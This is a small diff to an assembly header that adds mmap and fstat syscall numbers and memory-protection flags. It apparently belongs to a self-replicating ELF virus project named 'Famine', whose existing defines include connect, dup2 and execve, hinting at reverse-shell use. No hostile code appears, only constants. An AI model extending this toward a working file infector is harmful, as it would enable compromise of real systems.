@@ -7,6 +7,20 @@
 %define SYS_getdents64	217
 %define SYS_exit		60
 %define SYS_fork        57
+%define SYS_fstat       5
+%define SYS_mmap        9
+%define SYS_munmap      11
+
+; mmap define
+%define PROT_READ      1
+%define PROT_WRITE     2
+%define PROT_EXEC      4
+%define MAP_PRIVATE    2
+%define MAP_ANONYMOUS 32
+%define MAP_FIXED     16
+%define MAP_SHARED     1
+
+
 %define O_RDONLY		0
 %define SYS_setsid      112
 %define SYS_openat		257
@@ -25,6 +39,7 @@
 %define SYS_connect 42
 %define SYS_dup2	33
 %define SYS_execve	59
+
 %define FAMINE_SIZE end_addr - _start
 %define FAMINE_SIZE_NO_BSS buffer_bss - _start
 
